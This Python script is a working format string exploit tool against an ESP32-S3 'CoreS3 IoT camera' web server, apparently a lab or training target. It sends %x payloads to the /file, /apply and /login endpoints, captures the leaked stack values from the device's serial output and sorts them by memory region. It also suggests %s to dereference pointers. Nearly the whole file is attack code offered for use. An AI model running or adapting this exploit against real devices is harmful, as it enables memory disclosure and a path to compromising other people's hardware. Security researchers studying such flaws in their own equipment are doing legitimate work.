#!/usr/bin/env python3
"""
Format String Exploit Tool

Generates and sends format string payloads to the CoreS3 IoT camera's web
server endpoints that pass user input directly to printf() via logAccess().
Leaked stack values appear on the device's serial output (UART), not in the
HTTP response.

Vulnerable endpoints:
  GET  /file?name=PAYLOAD   (no auth required)
  POST /apply  ssid=PAYLOAD
  POST /login  username=PAYLOAD

The tool can:
  - Generate %x payloads to walk the stack and leak memory
  - Send payloads to the device over HTTP
  - Monitor the serial port for leaked values
  - Parse and display leaked stack contents

Usage examples:

  # Walk the stack 8 positions deep via /file endpoint
  ./fmt_string.py --target http://192.168.4.1 --depth 8

  # Walk 16 positions and monitor serial for output
  ./fmt_string.py --depth 16 --serial-port /dev/ttyACM0

  # Use a different endpoint
  ./fmt_string.py --endpoint /login --depth 8

  # Just generate the payload URL without sending
  ./fmt_string.py --depth 12 --dry-run
"""

import argparse
import re
import sys
import time
import urllib.parse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import serial
    HAS_SERIAL = True
except ImportError:
    HAS_SERIAL = False


DEFAULT_TARGET = "http://192.168.4.1"
DEFAULT_ENDPOINT = "/file"
DEFAULT_DEPTH = 8
DEFAULT_SERIAL_PORT = "/dev/ttyACM0"
DEFAULT_BAUD = 115200


def build_format_payload(depth, separator="."):
    """Build a format string payload with the specified number of %x specifiers."""
    specifiers = ["%x"] * depth
    return separator.join(specifiers)


def url_encode_format_payload(payload):
    """URL-encode a format string payload. Percent signs must become %25."""
    # Replace % with %25 for URL encoding of format specifiers
    return payload.replace("%", "%25")


def send_payload_file(target, payload_urlencoded):
    """Send format string payload via GET /file?name=..."""
    url = "%s/file?name=%s" % (target, payload_urlencoded)
    if HAS_REQUESTS:
        try:
            resp = requests.get(url, timeout=5)
            return resp.status_code, resp.text, url
        except requests.exceptions.RequestException as e:
            return None, str(e), url
    else:
        # Fall back to urllib
        try:
            import urllib.request
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=5)
            return resp.status, resp.read().decode("utf-8", errors="replace"), url
        except Exception as e:
            return None, str(e), url


def send_payload_apply(target, payload):
    """Send format string payload via POST /apply (ssid parameter)."""
    url = "%s/apply" % target
    data = "ssid=%s&pass=test" % urllib.parse.quote(payload)
    if HAS_REQUESTS:
        try:
            resp = requests.post(url, data=data, timeout=5)
            return resp.status_code, resp.text, url
        except requests.exceptions.RequestException as e:
            return None, str(e), url
    else:
        try:
            import urllib.request
            req = urllib.request.Request(url, data=data.encode(), method="POST")
            resp = urllib.request.urlopen(req, timeout=5)
            return resp.status, resp.read().decode("utf-8", errors="replace"), url
        except Exception as e:
            return None, str(e), url


def send_payload_login(target, payload):
    """Send format string payload via POST /login (username parameter)."""
    url = "%s/login" % target
    data = "username=%s&password=test" % urllib.parse.quote(payload)
    if HAS_REQUESTS:
        try:
            resp = requests.post(url, data=data, timeout=5)
            return resp.status_code, resp.text, url
        except requests.exceptions.RequestException as e:
            return None, str(e), url
    else:
        try:
            import urllib.request
            req = urllib.request.Request(url, data=data.encode(), method="POST")
            resp = urllib.request.urlopen(req, timeout=5)
            return resp.status, resp.read().decode("utf-8", errors="replace"), url
        except Exception as e:
            return None, str(e), url


def parse_leaked_values(serial_output):
    """Extract hex values from serial output that look like leaked stack data."""
    # Match hex values in the ACCESS log line
    hex_pattern = re.compile(r"\b([0-9a-fA-F]{1,8})\b")
    values = []

    for line in serial_output.splitlines():
        if "[ACCESS]" in line:
            # Extract everything after the parameter name
            match = re.search(r"name=(.+)", line)
            if not match:
                match = re.search(r"ssid=(.+)", line)
            if not match:
                match = re.search(r"username=(.+)", line)
            if match:
                data = match.group(1)
                for m in hex_pattern.finditer(data):
                    try:
                        val = int(m.group(1), 16)
                        values.append(val)
                    except ValueError:
                        pass

    return values


def classify_address(value):
    """Classify an ESP32-S3 address by memory region."""
    if 0x3FC80000 <= value <= 0x3FCFFFFF:
        return "SRAM (data/stack)"
    elif 0x3FCA0000 <= value <= 0x3FCAFFFF:
        return "PSRAM data"
    elif 0x40000000 <= value <= 0x4001FFFF:
        return "ROM"
    elif 0x40370000 <= value <= 0x403BFFFF:
        return "IRAM (code)"
    elif 0x42000000 <= value <= 0x427FFFFF:
        return "Flash (code/rodata)"
    elif value < 0x100:
        return "small value (counter/flag)"
    elif value == 0:
        return "zero/NULL"
    else:
        return "unknown"


def read_serial_output(port, baud, timeout=3.0):
    """Read available data from the serial port for the given timeout."""
    if not HAS_SERIAL:
        return None

    try:
        ser = serial.Serial(port, baud, timeout=0.1)
        output = ""
        end_time = time.time() + timeout
        while time.time() < end_time:
            data = ser.read(1024)
            if data:
                output += data.decode("utf-8", errors="replace")
        ser.close()
        return output
    except serial.SerialException as e:
        print("[WARNING] Serial error: %s" % e)
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Format string exploit tool for leaking stack memory via serial output.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s --target http://192.168.4.1 --depth 8
  %(prog)s --depth 16 --serial-port /dev/ttyACM0
  %(prog)s --endpoint /login --depth 8
  %(prog)s --depth 12 --dry-run

The leaked values appear on the device serial console, not in the HTTP response.
Use --serial-port to capture them automatically, or monitor serial separately.
""",
    )

    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help="Device base URL (default: %s)" % DEFAULT_TARGET,
    )
    parser.add_argument(
        "--endpoint",
        default=DEFAULT_ENDPOINT,
        choices=["/file", "/apply", "/login"],
        help="Vulnerable endpoint to target (default: %s)" % DEFAULT_ENDPOINT,
    )
    parser.add_argument(
        "--depth",
        type=int,
        default=DEFAULT_DEPTH,
        help="Number of %%%%x specifiers to include (default: %d)" % DEFAULT_DEPTH,
    )
    parser.add_argument(
        "--serial-port",
        default=None,
        help="Serial port to monitor for leaked output (e.g., /dev/ttyACM0)",
    )
    parser.add_argument(
        "--baud",
        type=int,
        default=DEFAULT_BAUD,
        help="Serial baud rate (default: %d)" % DEFAULT_BAUD,
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Generate and display the payload without sending it",
    )
    parser.add_argument(
        "--separator",
        default=".",
        help="Separator between %%x specifiers in the payload (default: '.')",
    )

    args = parser.parse_args()

    print("[*] Format String Exploit Tool")
    print("=" * 50)
    print()

    # Build payload
    raw_payload = build_format_payload(args.depth, args.separator)
    encoded_payload = url_encode_format_payload(raw_payload)

    print("[*] Endpoint:      %s" % args.endpoint)
    print("[*] Stack depth:   %d positions" % args.depth)
    print("[*] Raw payload:   %s" % raw_payload)
    print("[*] URL-encoded:   %s" % encoded_payload)
    print()

    if args.endpoint == "/file":
        full_url = "%s/file?name=%s" % (args.target, encoded_payload)
        print("[CURL COMMAND]")
        print("curl '%s'" % full_url)
    elif args.endpoint == "/apply":
        print("[CURL COMMAND]")
        print("curl -X POST %s/apply -d 'ssid=%s&pass=test'" % (args.target, encoded_payload))
    elif args.endpoint == "/login":
        print("[CURL COMMAND]")
        print("curl -X POST %s/login -d 'username=%s&password=test'" % (args.target, encoded_payload))

    print()

    if args.dry_run:
        print("[*] Dry run - payload not sent.")
        print()
        print("[*] Monitor serial output with:")
        print("    pio device monitor -b 115200")
        print()
        print("[*] Look for lines like:")
        print("    [ACCESS] /file name=3ffc1a2c.0.3fca0034.a.40123456...")
        return

    # Start serial monitor if requested
    serial_before = ""
    if args.serial_port:
        if not HAS_SERIAL:
            print("[WARNING] pyserial not installed. Install with: pip install pyserial")
            print("[WARNING] Continuing without serial monitoring.")
        else:
            print("[*] Flushing serial port %s..." % args.serial_port)
            # Read and discard any buffered data
            read_serial_output(args.serial_port, args.baud, timeout=0.5)

    # Send the payload
    print("[*] Sending payload to %s%s..." % (args.target, args.endpoint))
    print()

    if args.endpoint == "/file":
        status, response, url = send_payload_file(args.target, encoded_payload)
    elif args.endpoint == "/apply":
        status, response, url = send_payload_apply(args.target, raw_payload)
    elif args.endpoint == "/login":
        status, response, url = send_payload_login(args.target, raw_payload)

    if status is not None:
        print("[*] HTTP response: %d" % status)
    else:
        print("[!] Request failed: %s" % response)
        if "Connection refused" in response or "No route" in response:
            print("[*] Is the device connected and accessible at %s?" % args.target)

    # Read serial output
    if args.serial_port and HAS_SERIAL:
        print()
        print("[*] Reading serial output (waiting 2 seconds)...")
        serial_output = read_serial_output(args.serial_port, args.baud, timeout=2.0)

        if serial_output:
            print()
            print("[SERIAL OUTPUT]")
            for line in serial_output.splitlines():
                if line.strip():
                    print("  %s" % line.rstrip())

            # Parse leaked values
            values = parse_leaked_values(serial_output)
            if values:
                print()
                print("[LEAKED STACK VALUES]")
                print("-" * 55)
                print("  %-4s  %-12s  %s" % ("Pos", "Value", "Region"))
                print("-" * 55)
                for i, val in enumerate(values):
                    region = classify_address(val)
                    print("  %-4d  0x%08x    %s" % (i + 1, val, region))
                print("-" * 55)
        else:
            print("[*] No serial output captured.")
    else:
        print()
        print("[*] Serial port not monitored. Check the device serial console for leaked values.")
        print("[*] Use --serial-port /dev/ttyACM0 to capture automatically.")

    print()
    print("[*] Tip: Increase --depth to walk further down the stack.")
    print("[*] Tip: Use %%s instead of %%x to dereference pointers (may crash device).")


if __name__ == "__main__":
    main()
